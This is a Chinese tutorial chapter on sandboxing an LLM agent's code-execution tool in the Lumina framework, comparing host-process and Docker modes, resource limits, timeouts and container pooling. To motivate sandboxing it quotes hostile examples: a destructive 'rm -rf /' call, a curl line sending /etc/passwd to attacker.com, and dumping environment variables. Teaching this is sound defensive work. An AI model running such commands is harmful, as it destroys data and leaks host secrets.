# J02 — Code Interpreter 代码沙箱

> **前置要求**：已完成 [J01-Webhook](J01-webhook-wechat-bot.md)
> **预计阅读**：15 分钟
> **难度**：⭐⭐⭐☆☆

---

## 这节解决什么问题

Agent 遇到"算一下这批数据的均值和方差""把这段 JSON 解析后按字段排序"这类任务时，纯靠 LLM 心算容易出错（尤其是精确数值计算）。正确做法是让 LLM **写一段代码并实际运行**，拿到真实输出。但运行 LLM 生成的代码有巨大安全风险——它可能写 `os.system("rm -rf /")`、可能死循环吃满 CPU、可能发起网络请求泄露数据。

本节拆解 Lumina 的 `CodeInterpreterToolProvider` 如何在"给 Agent 算力"和"防住它搞破坏"之间取得平衡。

---

## 类比：孩子玩耍的两种场地

把 LLM 生成的代码比作一个精力旺盛但不懂事的孩子，你要给它找个地方玩：

- **process 模式 = 让孩子在自家客厅玩**。方便（不用出门）、启动快，但孩子可能打碎花瓶、弄脏地毯、乱翻冰箱——它在你家（宿主机）里，能碰到家里所有东西。适合你信任这个孩子（开发/演示环境）。
- **docker 模式 = 把孩子送到有围栏的专业游乐场**。游乐场有规则：限时（超时就拉走）、限量饭（内存上限）、不让打电话（禁网络）、围栏隔开（文件系统隔离）。孩子怎么闹都在围栏里，搞不坏你家。适合不信任的生产环境。

围栏就是 Docker 的资源限制：内存 256MB、CPU 1 核、网络禁用、容器退出即销毁。

---

## 一、@AgentTool：把代码执行注册为工具

Agent 调用工具的前提是工具被注册。`CodeInterpreterToolProvider` 用 `@AgentTool` 注解把 `execute` 方法暴露为名为 `code.execute` 的工具（第 132-137 行）：

```java
@AgentTool(
    name = "code.execute",
    description = "执行代码并返回输出结果。支持 python 和 javascript 语言。用于数据分析、计算等。",
    category = "code.interpreter"
)
public Map<String, Object> execute(String language, String code) { ... }
```

- **`description` 是给 LLM 看的**：LLM 根据这段描述判断"当前任务该不该调这个工具"。描述写得越准，LLM 误调/漏调的概率越低。
- **`category = "code.interpreter"`** 用于工具分组管理和权限控制（可按类别禁用某类工具）。
- 仅在 `lumina.agent.code-interpreter.enabled=true` 时装配（类上的 `@ConditionalOnProperty`），不启用则 LLM 根本看不到这个工具。

LLM 决定调用时，会生成 `{"language": "python", "code": "print(sum(range(101)))"}`，框架反射调用 `execute` 并把返回的 `Map` 回喂给 LLM。

---

## 二、两种执行模式

### 配置开关

```yaml
lumina:
  agent:
    code-interpreter:
      enabled: true
      mode: process          # process（本地进程）/ docker（容器隔离）
      timeout-seconds: 30
      max-output-length: 10000
```

### process 模式（第 203-242 行）

用 `ProcessBuilder` 启动外部解释器（`python3` 或 `node`），直接在宿主机执行：

```java
ProcessBuilder pb = new ProcessBuilder(interpreter, scriptFile.toString());
pb.redirectErrorStream(true);                    // stderr 合并到 stdout
Process process = pb.start();
boolean finished = process.waitFor(timeoutSeconds, TimeUnit.SECONDS);
if (!finished) {
    // 超时处理
}
String stdout = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
stdout = truncate(stdout);                       // 截断到 maxOutputLength
int exitCode = process.exitValue();
```

**风险点**：代码在宿主机直接跑，能访问宿主机文件系统、网络、环境变量。一段 `import os; os.system("...")` 就能搞破坏。只适合受控的开发/演示环境。

### docker 模式（第 255-331 行）

在 Docker 容器内隔离执行。容器创建时（第 339-364 行）配置资源限制：

```java
GenericContainer<?> container = new GenericContainer<>(image)
        .withFileSystemBind(codeDir.toString(), "/code", BindMode.READ_WRITE)  // 只挂载脚本目录
        .withCommand("sh", "-c", "sleep " + keepAliveSeconds);                 // 常驻等待 exec
container.withCreateContainerCmdModifier(createCmd -> {
    HostConfig hostConfig = ...;
    hostConfig.withMemory((long) memoryLimitMb * 1024 * 1024);    // 256MB 内存上限
    hostConfig.withNanoCPUs((long) (cpuLimit * 1_000_000_000L));  // 1 核 CPU
    if (disableNetwork) {
        createCmd.withNetworkDisabled(true);                       // 禁网络
    }
});
```

关键设计：
- **脚本目录挂载为 `/code`**（读写），代码文件放这里执行，但容器看不到宿主机其他路径。
- **`sleep` 常驻 + `execInContainer` 执行**：而不是直接 `withCommand("python3", script)`。原因是 Testcontainers 会把"容器快速退出且非零码"误判为**启动失败**，导致拿不到真实的非零退出码。用 sleep 保活再 exec 能可靠拿到退出码。
- **Docker 不可用时自动降级到 process**（`isDockerAvailable` 方法，第 191-198 行）——保证开发环境没装 Docker 也能用。

---

## 三、资源限制：防住四种"搞破坏"

| 风险 | 防护 | 配置项 | 默认值 |
|------|------|--------|--------|
| 死循环吃满 CPU | 超时强杀 | `timeout-seconds` | 30s |
| 无限输出撑爆内存 | 输出截断 | `max-output-length` | 10000 字符 |
| 内存泄漏拖垮宿主机 | 容器内存上限 | `memory-limit-mb` | 256MB |
| 网络请求泄露数据/攻击外网 | 容器禁网络 | `network-disabled` | true |
| 占满宿主机 CPU | 容器 CPU 上限 | `cpu-limit` | 1.0 核 |

### 超时的两种处理

**process 模式**（第 216-223 行 + finally）：

```java
boolean finished = process.waitFor(timeoutSeconds, TimeUnit.SECONDS);
if (!finished) {
    result.put("error", "代码执行超时（超过 " + timeoutSeconds + " 秒）");
    return result;
}
// finally 块：
if (process != null && process.isAlive()) {
    process.destroyForcibly();   // 任何路径都不残留子进程
}
```

**docker 模式**（第 410-427 行）：用 `CompletableFuture` + `future.get(timeout)` 控制 exec 超时。超时的容器**不归还到池中**（第 278-280 行），因为容器内可能还有进程在跑，复用会污染。

### 输出截断（第 534-540 行）

```java
private String truncate(String output) {
    if (output != null && output.length() > maxOutputLength) {
        return output.substring(0, maxOutputLength)
                + "\n... (已截断，完整输出 " + output.length() + " 字符)";
    }
    return output;
}
```

LLM 写个 `for i in range(10**8): print(i)` 就能产生 GB 级输出。截断保证回喂给 LLM 的内容不会撑爆上下文窗口。

---

## 四、脚本文件创建与清理

代码不能直接通过命令行参数传（shell 转义、长度限制都是坑），而是写入临时文件再执行（第 157-185 行）：

```java
Path scriptFile = null;
try {
    Path dir = Path.of(workDir);                              // ${java.io.tmpdir}/lumina-code
    Files.createDirectories(dir);
    String suffix = "python".equals(lang) ? ".py" : ".js";
    scriptFile = Files.createTempFile(dir, "code-", suffix);
    Files.writeString(scriptFile, code, StandardCharsets.UTF_8);
    // ... 执行 ...
} finally {
    if (scriptFile != null) {
        try {
            Files.deleteIfExists(scriptFile);                 // 用完即删
        } catch (IOException e) {
            log.warn("删除临时脚本文件失败: {}", e.getMessage());
        }
    }
}
```

`finally` 块保证无论执行成功、超时、异常，临时文件都会被清理——避免磁盘被残留脚本撑满。

---

## 五、容器池：避免冷启动开销

Docker 容器冷启动要 1-3 秒（拉镜像层、起进程），每次执行都新建容器会很慢。`pool-size > 0` 时启用容器池（第 580-669 行的 `ContainerPool` 内部类）：

- **按镜像维度缓存**：`ConcurrentHashMap<imageName, BlockingQueue<PooledContainer>>`，python 镜像和 node 镜像各自一个队列。
- **借出-归还**：执行前从队列 poll 一个存活容器，没有就新建；执行完归还（容器继续 `sleep` 保活，下次复用）。
- **空闲超时清理**：每次借出时顺带 `cleanupIdle`，销毁超过 `pool-idle-timeout-minutes`（默认 10 分钟）的容器。
- **超时容器不归还**：执行超时的容器内可能还有进程在跑，归还会污染下次执行——直接 stop 销毁（第 297-303 行）。
- **应用关闭时** `@PreDestroy` 的 `shutdownPool` 销毁所有常驻容器。

---

## 六、为什么生产环境必须用 docker 模式

process 模式有几个致命的生产环境问题：

1. **任意命令执行**：`import subprocess; subprocess.run(["curl", "http://attacker.com/?data=$(cat /etc/passwd)"])` 直接泄露宿主机敏感文件。
2. **资源耗尽**：一段死循环或大内存分配会让宿主机进程吃满 CPU/内存，影响同一机器上的其他服务。
3. **文件系统污染**：代码可以读写宿主机任意有权限的路径（`${java.io.tmpdir}` 通常对应用用户可写）。
4. **环境变量泄露**：`import os; print(os.environ)` 能拿到宿主机的 `DATABASE_URL`、API Key 等敏感配置。

docker 模式的围栏把这些问题都挡住了：禁网络防泄露/攻击、内存/CPU 上限防耗尽、文件系统挂载隔离防污染、容器内环境变量独立防泄露。**生产环境永远用 docker 模式**，process 模式仅用于本地开发调试。

---

## 小结

| 维度 | process 模式 | docker 模式 |
|------|-------------|------------|
| 执行方式 | ProcessBuilder 调 python3/node | Testcontainers 容器内 exec |
| 安全性 | 低（宿主机直接跑） | 高（256MB 内存 / 1 核 CPU / 禁网络） |
| 启动延迟 | 毫秒级 | 秒级（有容器池后可复用） |
| 适用场景 | 本地开发、演示、受控环境 | **生产环境** |
| Docker 不可用 | 始终可用 | 自动降级到 process |
| 超时处理 | `waitFor` + `destroyForcibly` | `CompletableFuture.get(timeout)` |
| 容器复用 | 不适用 | 容器池（按镜像缓存，空闲超时清理） |

**真实场景**：用户问"帮我分析这份 CSV 的月度趋势" → LLM 调用 `code.execute` 工具，生成 pandas 脚本 → docker 容器内执行 → 输出均值/方差/趋势 → LLM 基于真实计算结果给用户写分析报告。整个过程中容器禁网络，数据不会外泄。

---

## 自测

<details>
<summary><b>1. docker 模式为什么要用 <code>sleep + execInContainer</code> 而不是直接 <code>withCommand("python3", script)</code>？</b></summary>

因为 Testcontainers（以及底层 Docker 的启动检查逻辑）会把"容器启动后快速退出且退出码非零"**误判为容器启动失败**，从而抛异常，拿不到真实的非零退出码。比如代码有语法错误，python3 立刻以退出码 1 退出，Testcontainers 认为"容器没起来"。用 `sleep` 让容器常驻保活（视为"启动成功"），再通过 `execInContainer` 在容器内执行脚本，就能可靠拿到真实的退出码和 stdout/stderr。
</details>

<details>
<summary><b>2. 一段死循环代码执行超时了，process 模式和 docker 模式分别怎么处理？docker 模式下这个容器还能复用吗？</b></summary>

**process 模式**：`waitFor` 返回 false（超时），方法返回错误结果；`finally` 块里 `process.destroyForcibly()` 强杀子进程，保证不残留。

**docker 模式**：`execInContainerWithTimeout` 的 `future.get(timeout)` 抛 `TimeoutException`，`containerReusable` 被设为 false。`finally` 块里因为 `containerReusable == false`，直接 `pooled.getContainer().stop()` 销毁容器，**不归还到池中**。原因是超时的容器内可能还有进程在跑（死循环没被杀），如果归还复用，下次执行会受污染。所以超时容器必须销毁。
</details>

<details>
<summary><b>3. 为什么 <code>max-output-length</code> 默认只有 10000 字符？不截断会怎样？</b></summary>

因为代码执行的输出会作为工具结果**回喂给 LLM 的上下文窗口**。LLM 的上下文窗口有限（如 8K-128K tokens），如果代码 `print` 了 100MB 内容，全部塞进上下文会：(1) 直接超出上下文上限导致请求失败；(2) 即使没超，也会稀释有效信息、降低 LLM 对关键输出的注意力、增加 token 成本。截断到 10000 字符既够覆盖大部分正常输出（计算结果、报错信息），又留足上下文余量给对话历史。截断时会附加 `... (已截断，完整输出 N 字符)` 提示 LLM 输出被截了。
</details>

<details>
<summary><b>4. 容器池为什么要"按镜像维度"缓存（python 一个队列、node 一个队列），而不是所有容器混用一个池？</b></summary>

因为不同语言的执行依赖不同的镜像环境：python 代码必须在 python:3.11-slim 镜像的容器里跑，node 代码必须在 node:20-slim 镜像的容器里跑。如果混用一个池，借出的容器可能是错误的镜像（比如要跑 python 但借到的是 node 容器），执行必然失败。按镜像维度分队列（`ConcurrentHashMap<imageName, BlockingQueue>`）保证借出的容器镜像一定匹配当前请求的语言。这也是 `borrowContainer` 和 `returnContainer` 都以 `image` 为 key 的原因。
</details>

---

> 🚀 [J03 — Lumina AI 架构全景 →](J03-lumina-ai-architecture.md)

---

📝 **本篇撰写期间修正的代码**：无。
